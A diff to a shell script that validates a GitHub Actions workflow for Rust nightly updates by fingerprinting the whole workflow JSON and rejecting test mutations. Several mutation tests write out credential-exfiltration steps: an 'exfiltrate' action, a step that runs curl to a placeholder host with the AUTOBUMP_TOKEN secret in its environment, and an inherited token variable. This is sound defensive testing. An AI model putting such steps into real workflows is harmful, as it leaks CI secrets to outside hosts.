@@ -10,15 +10,22 @@ yq -o=json '.' "$workflow" >"$model"
 
 prepare_runner="\${{ format('ix-ci-run-{0}-{1}-update-rust-nightly-prepare', github.run_id, github.run_attempt) }}"
 publish_runner="\${{ format('ix-ci-run-{0}-{1}-update-rust-nightly-publish', github.run_id, github.run_attempt) }}"
-readonly expected_publish_job_sha256=28267bfbcac70e508ce0515ad0c604dbcfb14fdd7eb500dcd73eb315637e04a0
+readonly expected_workflow_sha256=da3ca207a1d6338678940b5c292c47b78505eae8fcc20b3c567105bf5a5ad7db
 validate_model() {
-  local publish_job_sha256
-  publish_job_sha256=$(
-    jq -cS '.jobs["publish-update"]' "$1" | sha256sum | cut -d ' ' -f1
+  local workflow_sha256
+  workflow_sha256=$(
+    jq -cS '.' "$1" | sha256sum | cut -d ' ' -f1
   )
-  # This job owns the PR credential. Fingerprinting its canonical JSON makes
-  # every action, shell command, service, and token-placement change explicit.
-  [[ $publish_job_sha256 == "$expected_publish_job_sha256" ]] || return 1
+  # The publish job inherits workflow-level defaults and environment. Hashing
+  # the complete model keeps those credential-relevant inputs in the boundary.
+  if [[ $workflow_sha256 != "$expected_workflow_sha256" ]]; then
+    if [[ ${2:-} != quiet ]]; then
+      printf 'workflow fingerprint changed: expected %s, observed %s\n' \
+        "$expected_workflow_sha256" "$workflow_sha256" >&2
+      printf 'review the complete workflow before updating expected_workflow_sha256\n' >&2
+    fi
+    return 1
+  fi
 
   jq --exit-status \
     --arg prepare_runner "$prepare_runner" \
@@ -77,9 +84,6 @@ validate_model() {
       | all(contains("nix run") or contains("nix flake") or contains(".#") | not))
     and (($prepare | tostring) | contains("rust-nightly-candidate-${{ github.sha }}-${{ github.run_attempt }}"))
     and (($publish | tostring) | contains("rust-nightly-candidate-${{ github.sha }}-${{ github.run_attempt }}"))
-    and (($publish | tostring) | contains("withoutPin"))
-    and (($publish | tostring) | contains("withoutChannel"))
-    and (($publish | tostring) | contains("normalize"))
     and (($prepare | tostring) | contains("AUTOBUMP_TOKEN") | not)
     and (($publish | tostring) | contains("AUTOBUMP_TOKEN"))
     and (($jobs | tostring) | contains("ubuntu-latest") | not)
@@ -91,7 +95,7 @@ validate_model "$model"
 reject_mutation() {
   local name=$1 filter=$2
   jq "$filter" "$model" >"$mutated"
-  if validate_model "$mutated"; then
+  if validate_model "$mutated" quiet; then
     printf 'workflow policy admitted mutation: %s\n' "$name" >&2
     exit 1
   fi
@@ -111,6 +115,8 @@ reject_mutation publish-pinned-action \
   '.jobs["publish-update"].steps += [{"uses":"example/exfiltrate@0000000000000000000000000000000000000000"}]'
 reject_mutation publish-credential-shell \
   '.jobs["publish-update"].steps += [{"env":{"TOKEN":"${{ secrets.AUTOBUMP_TOKEN || github.token }}"},"run":"curl https://example.invalid"}]'
+reject_mutation inherited-publish-token \
+  '.env.PUBLISH_TOKEN = "${{ secrets.AUTOBUMP_TOKEN || github.token }}"'
 reject_mutation publish-evaluation \
   '.jobs["publish-update"].steps += [{"run":"nix run .#artifact-code"}]'
 reject_mutation broad-pr-staging \
